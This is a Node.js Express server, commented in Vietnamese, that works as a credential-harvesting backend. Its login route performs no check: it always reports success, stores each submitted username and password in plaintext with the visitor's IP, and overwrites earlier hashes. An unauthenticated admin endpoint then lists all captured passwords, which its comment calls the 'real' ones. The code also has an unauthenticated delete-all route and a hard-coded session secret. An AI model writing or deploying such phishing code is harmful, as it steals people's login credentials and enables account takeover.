const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const Database = require('better-sqlite3');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Khởi tạo database
const dbPath = process.env.NODE_ENV === 'production' ? '/app/data/users.db' : 'users.db';
const db = new Database(dbPath);

// Tạo bảng users nếu chưa tồn tại (cập nhật schema)
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    email TEXT,
    password TEXT NOT NULL,
    last_login DATETIME,
    last_ip TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));
app.use(session({
  secret: 'your-secret-key-change-this',
  resave: false,
  saveUninitialized: false,
  cookie: { secure: false, maxAge: 24 * 60 * 60 * 1000 } // 1 ngày
}));

// API: Đăng ký
app.post('/api/register', async (req, res) => {
  const { username, email, password } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: 'Vui lòng điền đầy đủ thông tin' });
  }

  if (password.length < 6) {
    return res.status(400).json({ error: 'Mật khẩu phải có ít nhất 6 ký tự' });
  }

  try {
    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Lưu vào database
    const stmt = db.prepare('INSERT INTO users (username, email, password) VALUES (?, ?, ?)');
    stmt.run(username, email, hashedPassword);

    res.json({ success: true, message: 'Đăng ký thành công!' });
  } catch (error) {
    if (error.message.includes('UNIQUE constraint failed')) {
      return res.status(400).json({ error: 'Username hoặc email đã tồn tại' });
    }
    res.status(500).json({ error: 'Lỗi server' });
  }
});

// API: Đăng nhập (chỉ lưu thông tin, không kiểm tra)
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const clientIP = req.ip || req.connection.remoteAddress || 'unknown';

  if (!username || !password) {
    return res.status(400).json({ error: 'Vui lòng điền đầy đủ thông tin' });
  }

  try {
    // Luôn "thành công" - chỉ lưu thông tin vào database
    // Kiểm tra xem username đã tồn tại chưa
    const existingUser = db.prepare('SELECT id FROM users WHERE username = ? OR email = ?').get(username, username);
    
    if (existingUser) {
      // Cập nhật password mới nếu đã tồn tại
      const updateStmt = db.prepare('UPDATE users SET password = ?, last_login = CURRENT_TIMESTAMP, last_ip = ? WHERE id = ?');
      updateStmt.run(password, clientIP, existingUser.id);
    } else {
      // Tạo user mới
      const insertStmt = db.prepare('INSERT INTO users (username, email, password, last_login, last_ip) VALUES (?, ?, ?, CURRENT_TIMESTAMP, ?)');
      insertStmt.run(username, username, password, clientIP);
    }

    // Tạo session giả
    req.session.userId = Date.now(); // ID giả
    req.session.username = username;

    res.json({ 
      success: true, 
      message: 'Đăng nhập thành công!',
      user: { 
        id: Date.now(),
        username: username, 
        email: username 
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Lỗi server' });
  }
});

// API: Kiểm tra đăng nhập
app.get('/api/me', (req, res) => {
  if (req.session.userId) {
    const stmt = db.prepare('SELECT id, username, email, created_at FROM users WHERE id = ?');
    const user = stmt.get(req.session.userId);
    res.json({ loggedIn: true, user });
  } else {
    res.json({ loggedIn: false });
  }
});

// API: Đăng xuất
app.post('/api/logout', (req, res) => {
  req.session.destroy();
  res.json({ success: true, message: 'Đã đăng xuất' });
});

// API: Lấy danh sách users (admin) - hiển thị password thật
app.get('/api/users', (req, res) => {
  const stmt = db.prepare('SELECT id, username, email, password, last_login, last_ip, created_at FROM users ORDER BY last_login DESC');
  const users = stmt.all();
  res.json(users);
});

// API: Xóa tất cả users (admin)
app.post('/api/clear-all', (req, res) => {
  try {
    const stmt = db.prepare('DELETE FROM users');
    const result = stmt.run();
    
    // Reset auto-increment
    db.exec('DELETE FROM sqlite_sequence WHERE name="users"');
    
    res.json({ 
      success: true, 
      message: `Deleted ${result.changes} users`,
      deletedCount: result.changes
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve admin page
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// API: Thống kê
app.get('/api/stats', (req, res) => {
  try {
    const totalUsers = db.prepare('SELECT COUNT(*) as count FROM users').get().count;
    const recentUsers = db.prepare('SELECT COUNT(*) as count FROM users WHERE created_at >= datetime(\'now\', \'-24 hours\')').get().count;
    
    res.json({
      totalUsers,
      recentUsers,
      lastUpdated: new Date().toISOString()
    });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// Serve trang chính
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server đang chạy tại http://localhost:${PORT}`);
});
